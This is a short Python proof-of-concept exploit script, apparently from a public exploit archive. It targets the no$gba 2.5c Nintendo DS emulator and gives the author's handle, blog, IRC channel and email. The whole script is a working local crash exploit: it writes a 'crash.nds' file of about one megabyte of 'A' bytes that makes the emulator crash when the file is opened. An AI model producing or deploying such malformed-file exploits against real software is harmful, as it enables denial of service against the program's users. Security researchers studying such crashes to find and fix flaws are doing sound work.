#!/usr/bin/env python
#no$gba 2.5c (.nds) local crash
#Software Link: http://nocash.emubase.de/no$gba-w.zip
#Author: l3D
#Site: http://xraysecurity.blogspot.com
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com

bad=file('crash.nds', 'w')
bad.write('A'*0x100000)
bad.close()